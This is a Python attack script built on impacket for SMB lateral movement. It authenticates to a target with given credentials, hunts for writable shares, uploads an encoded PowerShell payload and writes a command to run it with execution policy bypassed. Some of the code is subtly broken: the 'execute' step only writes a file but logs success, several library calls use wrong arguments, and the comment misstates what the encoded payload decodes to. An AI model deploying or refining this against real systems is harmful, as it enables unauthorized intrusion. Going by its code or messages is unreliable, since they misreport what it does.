import sys
import logging
from impacket.smbconnection import SMBConnection
from impacket.smb import SessionError

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def smb_lateral_move(target, username, password):
    try:
        logging.info(f"[*] Attempting SMB authentication on {target} with {username}...")
        
        # Establish SMB connection
        conn = SMBConnection(target, username, password, '', '', domain='', use_ntlm_v2=True)
        conn.login()
        logging.info(f"[+] Successfully authenticated on {target} as {username}")

        # List accessible shares
        shares = conn.listShares()
        writable_shares = []
        for share in shares:
            share_name = share['shi1_netname'].decode().strip()
            logging.info(f"[*] Found share: {share_name}")
            # Check write access
            try:
                test_file = f"\\{share_name}\\test_write.txt"
                conn.createFile(share_name, "test_write.txt")
                conn.deleteFile(share_name, "test_write.txt")
                writable_shares.append(share_name)
                logging.info(f"[+] Writable share found: {share_name}")
            except:
                pass  # Not writable

        # Deploy payload if writable share is found
        if writable_shares:
            deploy_payload(conn, writable_shares[0])
        
        conn.logoff()
        logging.info("[*] SMB session closed.")
        
    except SessionError as e:
        logging.error(f"[!] Authentication failed on {target}: {str(e)}")
    except Exception as e:
        logging.error(f"[!] Unexpected error: {str(e)}")

def deploy_payload(conn, share):
    """
    Uploads a PowerShell payload for remote execution
    """
    try:
        payload = "powershell.exe -enc UwB0AG8AcgBwAG8AcgBlACAAJwBJACA="  # Example: "Stop-Process 'IEX'"
        payload_file = "payload.ps1"
        
        # Upload the payload
        conn.createFile(share, payload_file)
        conn.writeFile(share, payload_file, payload.encode())
        logging.info(f"[+] Payload uploaded to {share}\\{payload_file}")

        # Remote execution using SMBExec or PsExec
        execute_remote_command(conn, share, f"powershell.exe -ExecutionPolicy Bypass -File \\\\{share}\\{payload_file}")
    
    except Exception as e:
        logging.error(f"[!] Payload deployment failed: {str(e)}")

def execute_remote_command(conn, share, command):
    """
    Executes a remote command via SMB
    """
    try:
        logging.info(f"[*] Attempting remote command execution on {share}...")
        conn.createFile(share, "exec.cmd")
        conn.writeFile(share, "exec.cmd", command.encode())
        logging.info(f"[+] Command executed: {command}")
    
    except Exception as e:
        logging.error(f"[!] Command execution failed: {str(e)}")

# Example Usage:
if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target> <username> <password>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    
    smb_lateral_move(target_ip, username, password)
